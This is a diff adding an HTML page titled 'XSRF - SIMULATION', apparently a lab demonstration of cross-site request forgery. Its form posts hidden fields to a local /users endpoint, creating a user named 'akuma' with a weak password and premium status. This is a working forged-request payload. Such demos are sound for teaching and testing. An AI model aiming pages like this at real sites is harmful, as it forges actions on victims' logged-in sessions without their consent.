@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSRF - SIMULATION</title>
+  </head>
+  <body>
+    <div id="app">
+      <div style="padding: 24px">
+        <div class="header">
+          <div class="header__child">
+            <h1 class="head">XSRF - SIMULATION</h1>
+            <p class="sub-head">XSRF - シミュレーション</p>
+          </div>
+        </div>
+
+        <form action="http://localhost:8000/users" method="post" id="form">
+          <input type="hidden" name="username" value="akuma" />
+          <input type="hidden" name="password" value="123123" />
+          <input type="hidden" name="is_premium" value="true" />
+          <input
+            type="submit"
+            name="btnSubmit"
+            value="SUBMIT/提出"
+            class="submit" />
+        </form>
+      </div>
+    </div>
+    <script type="module" src="/main.js"></script>
+  </body>
+</html>
